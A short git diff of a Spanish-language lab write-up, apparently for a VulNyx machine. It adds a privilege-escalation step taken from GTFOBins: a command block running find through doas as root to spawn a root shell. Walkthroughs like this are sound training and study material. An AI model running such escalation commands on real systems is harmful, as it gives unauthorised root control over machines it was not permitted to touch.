@@ -112,7 +112,11 @@ find . -exec /bin/sh \; -quit
 
 ![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/6f16b0dd-cd6c-42ca-8299-3076417ea9db)
 
-Colocamos el comando encontrado en GTFObins, especificando que lo ejecutaremos con el comando DOAS y utilizando el usuario ROOT.
+Colocamos el comando encontrado en GTFObins, especificando que lo ejecutaremos con el comando DOAS y utilizando el usuario ROOT, tambien colocando la ruta absoluta del binario.
+
+```
+doas -u root /usr/bin/find . -exec /bin/sh \; -quit
+```
 
 ![image](https://github.com/Cesmendaro/vulnyx/assets/153618246/bde0fc3d-b6b8-4e4f-a3cd-3505afd80fef)
 
